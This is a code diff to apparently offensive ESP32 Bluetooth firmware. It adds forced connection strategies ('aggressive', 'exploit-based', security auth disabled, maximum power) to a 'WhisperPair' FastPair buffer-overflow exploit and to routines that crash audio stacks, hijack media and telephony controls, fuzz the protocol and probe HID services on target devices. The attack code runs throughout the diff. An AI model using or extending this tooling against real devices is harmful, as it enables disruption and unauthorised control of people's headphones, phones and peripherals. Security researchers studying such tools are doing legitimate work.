@@ -109,14 +109,19 @@ void BLEAttackManager::cleanupAfterAttack() {
     }
 }
 
-bool BLEAttackManager::connectToDevice(NimBLEAddress target, NimBLEClient** outClient) {
+bool BLEAttackManager::connectToDevice(NimBLEAddress target, NimBLEClient** outClient, bool useExploitHandshake) {
     NimBLEClient* pClient = NimBLEDevice::createClient();
     if(!pClient) {
         return false;
     }
     
-    pClient->setConnectTimeout(8);
-    pClient->setConnectionParams(12, 12, 0, 400);
+    if(useExploitHandshake) {
+        pClient->setConnectTimeout(12);
+        pClient->setConnectionParams(6, 6, 0, 100);
+    } else {
+        pClient->setConnectTimeout(8);
+        pClient->setConnectionParams(12, 12, 0, 400);
+    }
     
     bool connected = pClient->connect(target, false);
     if(connected) {
@@ -135,6 +140,81 @@ bool BLEAttackManager::connectToDevice(NimBLEAddress target, NimBLEClient** outC
     
     NimBLEDevice::deleteClient(pClient);
     return false;
+}
+
+NimBLEClient* attemptConnectionWithStrategies(NimBLEAddress target, String& connectionMethod) {
+    NimBLEClient* pClient = nullptr;
+    
+    showAttackProgress("Trying normal connection...", TFT_WHITE);
+    BLEAttackManager bleManager;
+    bleManager.prepareForConnection();
+    
+    if(bleManager.connectToDevice(target, &pClient, false)) {
+        connectionMethod = "Normal connection";
+        return pClient;
+    }
+    bleManager.cleanupAfterAttack();
+    delay(500);
+    
+    showAttackProgress("Trying aggressive connection...", TFT_YELLOW);
+    bleManager.prepareForConnection();
+    
+    NimBLEDevice::setPower(ESP_PWR_LVL_P9);
+    pClient = NimBLEDevice::createClient();
+    if(pClient) {
+        pClient->setConnectTimeout(12);
+        pClient->setConnectionParams(6, 6, 0, 100);
+        
+        if(pClient->connect(target, false)) {
+            int waitCount = 0;
+            while(!pClient->isConnected() && waitCount < 100) {
+                delay(50);
+                waitCount++;
+            }
+            
+            if(pClient->isConnected()) {
+                connectionMethod = "Aggressive connection";
+                return pClient;
+            }
+        }
+        NimBLEDevice::deleteClient(pClient);
+    }
+    bleManager.cleanupAfterAttack();
+    delay(500);
+    
+    showAttackProgress("Trying exploit-based connection...", TFT_ORANGE);
+    
+    NimBLEDevice::deinit(true);
+    delay(800);
+    NimBLEDevice::init("Bruce-Exploit");
+    NimBLEDevice::setPower(ESP_PWR_LVL_P9);
+    NimBLEDevice::setSecurityAuth(false, false, false);
+    delay(500);
+    
+    pClient = NimBLEDevice::createClient();
+    if(pClient) {
+        pClient->setConnectTimeout(15);
+        pClient->setConnectionParams(12, 12, 0, 400);
+        
+        for(int attempt = 0; attempt < 3; attempt++) {
+            if(pClient->connect(target, false)) {
+                int waitCount = 0;
+                while(!pClient->isConnected() && waitCount < 150) {
+                    delay(50);
+                    waitCount++;
+                }
+                
+                if(pClient->isConnected()) {
+                    connectionMethod = "Exploit-based connection";
+                    return pClient;
+                }
+            }
+            delay(300);
+        }
+        NimBLEDevice::deleteClient(pClient);
+    }
+    
+    return nullptr;
 }
 
 NimBLERemoteCharacteristic* WhisperPairExploit::findKBPCharacteristic(NimBLERemoteService* fastpairService) {
@@ -240,35 +320,43 @@ bool WhisperPairExploit::execute(NimBLEAddress target) {
         return false;
     }
 
-    bleManager.prepareForConnection();
-
-    NimBLEClient* pClient = nullptr;
-    if(!bleManager.connectToDevice(target, &pClient)) {
-        showAttackResult(false, "Connection failed");
-        bleManager.cleanupAfterAttack();
+    String connectionMethod = "";
+    NimBLEClient* pClient = attemptConnectionWithStrategies(target, connectionMethod);
+    
+    if(!pClient) {
+        showAttackResult(false, "Failed to connect with all strategies");
         return false;
     }
 
+    showAttackProgress("Connected! Testing vulnerability...", TFT_GREEN);
+    delay(500);
+
     if(!pClient->discoverAttributes()) {
         showAttackResult(false, "Service discovery failed");
-        pClient->disconnect();
-        bleManager.cleanupAfterAttack();
+        if(pClient->isConnected()) {
+            pClient->disconnect();
+        }
+        NimBLEDevice::deinit(true);
         return false;
     }
 
     NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
     if(!pService) {
         showAttackResult(false, "FastPair service not found");
-        pClient->disconnect();
-        bleManager.cleanupAfterAttack();
+        if(pClient->isConnected()) {
+            pClient->disconnect();
+        }
+        NimBLEDevice::deinit(true);
         return false;
     }
 
     NimBLERemoteCharacteristic* pKbpChar = findKBPCharacteristic(pService);
     if(!pKbpChar) {
         showAttackResult(false, "No writable KBP characteristic");
-        pClient->disconnect();
-        bleManager.cleanupAfterAttack();
+        if(pClient->isConnected()) {
+            pClient->disconnect();
+        }
+        NimBLEDevice::deinit(true);
         return false;
     }
 
@@ -288,22 +376,40 @@ bool WhisperPairExploit::execute(NimBLEAddress target) {
     if(pClient->isConnected()) {
         pClient->disconnect();
     }
-    bleManager.cleanupAfterAttack();
+    NimBLEDevice::deinit(true);
+    delay(300);
 
     if(isVulnerable) {
-        showAttackResult(true, "DEVICE MAY BE VULNERABLE!");
+        std::vector<String> lines;
+        lines.push_back("WHISPERPAIR EXPLOIT SUCCESS!");
+        lines.push_back("Connection: " + connectionMethod);
+        lines.push_back("Result: Device is VULNERABLE");
+        lines.push_back("");
+        lines.push_back("Device appears vulnerable to");
+        lines.push_back("FastPair buffer overflow");
+        
+        showDeviceInfoScreen("EXPLOIT SUCCESS", lines, TFT_GREEN, TFT_BLACK);
         return true;
     } else {
-        showAttackResult(false, "Device appears patched");
+        std::vector<String> lines;
+        lines.push_back("WHISPERPAIR EXPLOIT");
+        lines.push_back("Connection: " + connectionMethod);
+        lines.push_back("Result: Device resisted exploit");
+        lines.push_back("");
+        lines.push_back("Device may be patched or");
+        lines.push_back("resisted the exploit");
+        
+        showDeviceInfoScreen("EXPLOIT RESISTED", lines, TFT_RED, TFT_WHITE);
         return false;
     }
 }
 
 bool WhisperPairExploit::executeSilent(NimBLEAddress target) {
+    BLEAttackManager bleManager;
     bleManager.prepareForConnection();
 
     NimBLEClient* pClient = nullptr;
-    if(!bleManager.connectToDevice(target, &pClient)) {
+    if(!bleManager.connectToDevice(target, &pClient, true)) {
         bleManager.cleanupAfterAttack();
         return false;
     }
@@ -526,12 +632,10 @@ bool AudioAttackService::attackTelephony(NimBLERemoteService* teleService) {
 }
 
 bool AudioAttackService::executeAudioAttack(NimBLEAddress target) {
-    BLEAttackManager bleManager;
-    bleManager.prepareForConnection();
-
-    NimBLEClient* pClient = nullptr;
-    if(!bleManager.connectToDevice(target, &pClient)) {
-        bleManager.cleanupAfterAttack();
+    String connectionMethod = "";
+    NimBLEClient* pClient = attemptConnectionWithStrategies(target, connectionMethod);
+    
+    if(!pClient) {
         return false;
     }
 
@@ -540,7 +644,8 @@ bool AudioAttackService::executeAudioAttack(NimBLEAddress target) {
     if(pClient->isConnected()) {
         pClient->disconnect();
     }
-    bleManager.cleanupAfterAttack();
+    NimBLEDevice::deinit(true);
+    delay(300);
 
     return success;
 }
@@ -550,18 +655,18 @@ bool AudioAttackService::injectMediaCommands(NimBLEAddress target) {
 }
 
 bool AudioAttackService::crashAudioStack(NimBLEAddress target) {
-    BLEAttackManager bleManager;
-    bleManager.prepareForConnection();
-
-    NimBLEClient* pClient = nullptr;
-    if(!bleManager.connectToDevice(target, &pClient)) {
-        bleManager.cleanupAfterAttack();
+    String connectionMethod = "";
+    NimBLEClient* pClient = attemptConnectionWithStrategies(target, connectionMethod);
+    
+    if(!pClient) {
         return false;
     }
 
     if(!pClient->discoverAttributes()) {
-        pClient->disconnect();
-        bleManager.cleanupAfterAttack();
+        if(pClient->isConnected()) {
+            pClient->disconnect();
+        }
+        NimBLEDevice::deinit(true);
         return false;
     }
 
@@ -571,8 +676,10 @@ bool AudioAttackService::crashAudioStack(NimBLEAddress target) {
     }
 
     if(!pService) {
-        pClient->disconnect();
-        bleManager.cleanupAfterAttack();
+        if(pClient->isConnected()) {
+            pClient->disconnect();
+        }
+        NimBLEDevice::deinit(true);
         return false;
     }
 
@@ -586,8 +693,10 @@ bool AudioAttackService::crashAudioStack(NimBLEAddress target) {
     }
 
     if(!pChar) {
-        pClient->disconnect();
-        bleManager.cleanupAfterAttack();
+        if(pClient->isConnected()) {
+            pClient->disconnect();
+        }
+        NimBLEDevice::deinit(true);
         return false;
     }
 
@@ -608,7 +717,8 @@ bool AudioAttackService::crashAudioStack(NimBLEAddress target) {
     if(pClient->isConnected()) {
         pClient->disconnect();
     }
-    bleManager.cleanupAfterAttack();
+    NimBLEDevice::deinit(true);
+    delay(300);
 
     return (sent1 || sent2 || sent3);
 }
@@ -840,8 +950,7 @@ void executeSelectedAttack(int attackIndex, NimBLEAddress target) {
 
 void runWhisperPairAttack(NimBLEAddress target) {
     WhisperPairExploit exploit;
-    bool success = exploit.execute(target);
-    showAttackResult(success, success ? "FastPair attack attempted!" : "Attack failed");
+    exploit.execute(target);
 }
 
 void runAudioStackCrash(NimBLEAddress target) {
@@ -849,10 +958,34 @@ void runAudioStackCrash(NimBLEAddress target) {
         return;
     }
     
-    showAttackProgress("Attacking audio stack...", TFT_WHITE);
+    String connectionMethod = "";
+    NimBLEClient* pClient = attemptConnectionWithStrategies(target, connectionMethod);
+    
+    if(!pClient) {
+        showAttackResult(false, "Failed to connect");
+        return;
+    }
+    
+    showAttackProgress("Connected! Attacking audio stack...", TFT_GREEN);
+    
     AudioAttackService audioAttack;
     bool result = audioAttack.crashAudioStack(target);
-    showAttackResult(result, result ? "Audio stack attack sent!" : "Attack failed");
+    
+    std::vector<String> lines;
+    lines.push_back("AUDIO STACK CRASH ATTACK");
+    lines.push_back("Connection: " + connectionMethod);
+    lines.push_back("Result: " + String(result ? "SUCCESS" : "FAILED"));
+    lines.push_back("");
+    
+    if(result) {
+        lines.push_back("Audio stack crash commands");
+        lines.push_back("were successfully sent!");
+        showDeviceInfoScreen("ATTACK SENT", lines, TFT_GREEN, TFT_BLACK);
+    } else {
+        lines.push_back("No audio services found or");
+        lines.push_back("attack commands failed");
+        showDeviceInfoScreen("ATTACK FAILED", lines, TFT_RED, TFT_WHITE);
+    }
 }
 
 void runMediaCommandHijack(NimBLEAddress target) {
@@ -860,38 +993,67 @@ void runMediaCommandHijack(NimBLEAddress target) {
         return;
     }
     
-    showAttackProgress("Injecting media commands...", TFT_WHITE);
+    String connectionMethod = "";
+    NimBLEClient* pClient = attemptConnectionWithStrategies(target, connectionMethod);
+    
+    if(!pClient) {
+        showAttackResult(false, "Failed to connect");
+        return;
+    }
+    
+    showAttackProgress("Connected! Injecting media commands...", TFT_GREEN);
+    
     AudioAttackService audioAttack;
     bool result = audioAttack.injectMediaCommands(target);
-    showAttackResult(result, result ? "Media commands sent!" : "No media service found");
+    
+    std::vector<String> lines;
+    lines.push_back("MEDIA COMMAND HIJACK");
+    lines.push_back("Connection: " + connectionMethod);
+    lines.push_back("Result: " + String(result ? "SUCCESS" : "FAILED"));
+    lines.push_back("");
+    
+    if(result) {
+        lines.push_back("Media control commands");
+        lines.push_back("were successfully sent!");
+        showDeviceInfoScreen("COMMANDS SENT", lines, TFT_GREEN, TFT_BLACK);
+    } else {
+        lines.push_back("No media services found or");
+        lines.push_back("commands failed");
+        showDeviceInfoScreen("ATTACK FAILED", lines, TFT_RED, TFT_WHITE);
+    }
 }
 
 void runQuickTest(NimBLEAddress target) {
     showAttackProgress("Quick testing...", TFT_WHITE);
     WhisperPairExploit exploit;
     bool result = exploit.executeSilent(target);
-    showAttackResult(result, result ? "VULNERABLE!" : "Patched/Safe");
+    
+    if(result) {
+        showAttackResult(true, "VULNERABLE!");
+    } else {
+        showAttackResult(false, "Patched/Safe");
+    }
 }
 
 void runWriteAccessTest(NimBLEAddress target) {
     if(!confirmAttack("Test write access on all characteristics?")) return;
     
-    showAttackProgress("Testing write access...", TFT_WHITE);
+    String connectionMethod = "";
+    NimBLEClient* pClient = attemptConnectionWithStrategies(target, connectionMethod);
     
-    BLEAttackManager bleManager;
-    bleManager.prepareForConnection();
-    
-    NimBLEClient* pClient = nullptr;
-    if(!bleManager.connectToDevice(target, &pClient)) {
-        showAttackResult(false, "Connection failed");
-        bleManager.cleanupAfterAttack();
+    if(!pClient) {
+        showAttackResult(false, "Failed to connect");
         return;
     }
     
+    showAttackProgress("Connected! Testing write access...", TFT_GREEN);
+    
     if(!pClient->discoverAttributes()) {
         showAttackResult(false, "Discovery failed");
-        pClient->disconnect();
-        bleManager.cleanupAfterAttack();
+        if(pClient->isConnected()) {
+            pClient->disconnect();
+        }
+        NimBLEDevice::deinit(true);
         return;
     }
     
@@ -915,11 +1077,12 @@ void runWriteAccessTest(NimBLEAddress target) {
     if(pClient->isConnected()) {
         pClient->disconnect();
     }
-    bleManager.cleanupAfterAttack();
+    NimBLEDevice::deinit(true);
     
     if(!writeableChars.empty()) {
         std::vector<String> lines;
         lines.push_back("WRITABLE CHARACTERISTICS:");
+        lines.push_back("Connection: " + connectionMethod);
         lines.push_back("Found: " + String(writeableChars.size()));
         
         for(int i = 0; i < std::min(5, (int)writeableChars.size()); i++) {
@@ -939,30 +1102,32 @@ void runWriteAccessTest(NimBLEAddress target) {
 void runProtocolFuzzer(NimBLEAddress target) {
     if(!confirmAttack("Fuzz BLE protocol with random data?")) return;
     
-    showAttackProgress("Starting protocol fuzzer...", TFT_WHITE);
+    String connectionMethod = "";
+    NimBLEClient* pClient = attemptConnectionWithStrategies(target, connectionMethod);
     
-    BLEAttackManager bleManager;
-    bleManager.prepareForConnection();
-    
-    NimBLEClient* pClient = nullptr;
-    if(!bleManager.connectToDevice(target, &pClient)) {
-        showAttackResult(false, "Connection failed");
-        bleManager.cleanupAfterAttack();
+    if(!pClient) {
+        showAttackResult(false, "Failed to connect");
         return;
     }
     
+    showAttackProgress("Connected! Fuzzing protocol...", TFT_GREEN);
+    
     if(!pClient->discoverAttributes()) {
         showAttackResult(false, "Discovery failed");
-        pClient->disconnect();
-        bleManager.cleanupAfterAttack();
+        if(pClient->isConnected()) {
+            pClient->disconnect();
+        }
+        NimBLEDevice::deinit(true);
         return;
     }
     
     NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
     if(!pService) {
         showAttackResult(false, "No FastPair service found");
-        pClient->disconnect();
-        bleManager.cleanupAfterAttack();
+        if(pClient->isConnected()) {
+            pClient->disconnect();
+        }
+        NimBLEDevice::deinit(true);
         return;
     }
     
@@ -978,12 +1143,12 @@ void runProtocolFuzzer(NimBLEAddress target) {
     
     if(!pChar) {
         showAttackResult(false, "No writable characteristic");
-        pClient->disconnect();
-        bleManager.cleanupAfterAttack();
+        if(pClient->isConnected()) {
+            pClient->disconnect();
+        }
+        NimBLEDevice::deinit(true);
         return;
     }
-    
-    showAttackProgress("Fuzzing protocol...", TFT_YELLOW);
     
     bool anySent = false;
     for(int i = 0; i < 10; i++) {
@@ -1012,9 +1177,13 @@ void runProtocolFuzzer(NimBLEAddress target) {
     if(pClient->isConnected()) {
         pClient->disconnect();
     }
-    bleManager.cleanupAfterAttack();
+    NimBLEDevice::deinit(true);
     
-    showAttackResult(anySent, anySent ? "Fuzzing completed!" : "Fuzzing failed");
+    if(anySent) {
+        showAttackResult(true, "Fuzzing completed!");
+    } else {
+        showAttackResult(false, "Fuzzing failed");
+    }
 }
 
 void runJamConnectAttack(NimBLEAddress target) {
@@ -1072,22 +1241,22 @@ void runJamConnectAttack(NimBLEAddress target) {
 void runHIDTest(NimBLEAddress target) {
     if(!confirmAttack("Test HID (Keyboard/Mouse) capabilities?")) return;
     
-    showAttackProgress("Testing HID services...", TFT_WHITE);
+    String connectionMethod = "";
+    NimBLEClient* pClient = attemptConnectionWithStrategies(target, connectionMethod);
     
-    BLEAttackManager bleManager;
-    bleManager.prepareForConnection();
-    
-    NimBLEClient* pClient = nullptr;
-    if(!bleManager.connectToDevice(target, &pClient)) {
-        showAttackResult(false, "Connection failed");
-        bleManager.cleanupAfterAttack();
+    if(!pClient) {
+        showAttackResult(false, "Failed to connect");
         return;
     }
     
+    showAttackProgress("Connected! Testing HID services...", TFT_GREEN);
+    
     if(!pClient->discoverAttributes()) {
         showAttackResult(false, "Discovery failed");
-        pClient->disconnect();
-        bleManager.cleanupAfterAttack();
+        if(pClient->isConnected()) {
+            pClient->disconnect();
+        }
+        NimBLEDevice::deinit(true);
         return;
     }
     
@@ -1124,11 +1293,12 @@ void runHIDTest(NimBLEAddress target) {
     if(pClient->isConnected()) {
         pClient->disconnect();
     }
-    bleManager.cleanupAfterAttack();
+    NimBLEDevice::deinit(true);
     
     if(!hidServices.empty()) {
         std::vector<String> lines;
         lines.push_back("HID SERVICES FOUND:");
+        lines.push_back("Connection: " + connectionMethod);
         
         for(int i = 0; i < std::min(6, (int)hidServices.size()); i++) {
             lines.push_back(hidServices[i]);
@@ -1324,79 +1494,53 @@ void audioCommandHijackTest() {
 }
 
 void executeAudioTest(int testIndex, NimBLEAddress target) {
+    String connectionMethod = "";
+    NimBLEClient* pClient = attemptConnectionWithStrategies(target, connectionMethod);
+    
+    if(!pClient) {
+        showAttackResult(false, "Failed to connect");
+        return;
+    }
+    
     AudioAttackService audioAttack;
-    BLEAttackManager bleManager;
     
     switch(testIndex) {
         case 0:
             showAttackProgress("Testing AVRCP service...", TFT_WHITE);
-            bleManager.prepareForConnection();
-            {
-                NimBLEClient* pClient = nullptr;
-                if(bleManager.connectToDevice(target, &pClient)) {
-                    if(pClient->discoverAttributes()) {
-                        NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0x110E));
-                        if(pService) {
-                            audioAttack.attackAVRCP(pService);
-                            showAttackResult(true, "AVRCP test completed");
-                        } else {
-                            showAttackResult(false, "No AVRCP service found");
-                        }
-                    }
-                    
-                    if(pClient->isConnected()) {
-                        pClient->disconnect();
-                    }
+            if(pClient->discoverAttributes()) {
+                NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0x110E));
+                if(pService) {
+                    audioAttack.attackAVRCP(pService);
+                    showAttackResult(true, "AVRCP test completed");
+                } else {
+                    showAttackResult(false, "No AVRCP service found");
                 }
-                bleManager.cleanupAfterAttack();
             }
             break;
             
         case 1:
             showAttackProgress("Testing Media Control...", TFT_WHITE);
-            bleManager.prepareForConnection();
-            {
-                NimBLEClient* pClient = nullptr;
-                if(bleManager.connectToDevice(target, &pClient)) {
-                    if(pClient->discoverAttributes()) {
-                        NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0x1843));
-                        if(pService) {
-                            audioAttack.attackAudioMedia(pService);
-                            showAttackResult(true, "Media control test completed");
-                        } else {
-                            showAttackResult(false, "No Media service found");
-                        }
-                    }
-                    
-                    if(pClient->isConnected()) {
-                        pClient->disconnect();
-                    }
+            if(pClient->discoverAttributes()) {
+                NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0x1843));
+                if(pService) {
+                    audioAttack.attackAudioMedia(pService);
+                    showAttackResult(true, "Media control test completed");
+                } else {
+                    showAttackResult(false, "No Media service found");
                 }
-                bleManager.cleanupAfterAttack();
             }
             break;
             
         case 2:
             showAttackProgress("Testing Telephony...", TFT_WHITE);
-            bleManager.prepareForConnection();
-            {
-                NimBLEClient* pClient = nullptr;
-                if(bleManager.connectToDevice(target, &pClient)) {
-                    if(pClient->discoverAttributes()) {
-                        NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0x1124));
-                        if(pService) {
-                            audioAttack.attackTelephony(pService);
-                            showAttackResult(true, "Telephony test completed");
-                        } else {
-                            showAttackResult(false, "No Telephony service found");
-                        }
-                    }
-                    
-                    if(pClient->isConnected()) {
-                        pClient->disconnect();
-                    }
+            if(pClient->discoverAttributes()) {
+                NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0x1124));
+                if(pService) {
+                    audioAttack.attackTelephony(pService);
+                    showAttackResult(true, "Telephony test completed");
+                } else {
+                    showAttackResult(false, "No Telephony service found");
                 }
-                bleManager.cleanupAfterAttack();
             }
             break;
             
@@ -1406,6 +1550,11 @@ void executeAudioTest(int testIndex, NimBLEAddress target) {
             showAttackResult(true, "Complete audio test done");
             break;
     }
+    
+    if(pClient->isConnected()) {
+        pClient->disconnect();
+    }
+    NimBLEDevice::deinit(true);
 }
 
 void showAttackProgress(const char* message, uint16_t color) {
